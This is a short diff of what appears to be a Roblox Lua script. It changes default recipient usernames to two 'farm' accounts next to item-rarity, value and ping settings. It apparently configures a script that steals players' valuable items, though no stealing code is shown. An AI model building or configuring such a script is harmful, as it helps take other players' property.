@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"StantY_Y"}
+local users = _G.Usernames or {"ZeeS_Farm2", "ZeeS_Farm4"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 50
 local ping = _G.pingEveryone or "Yes"
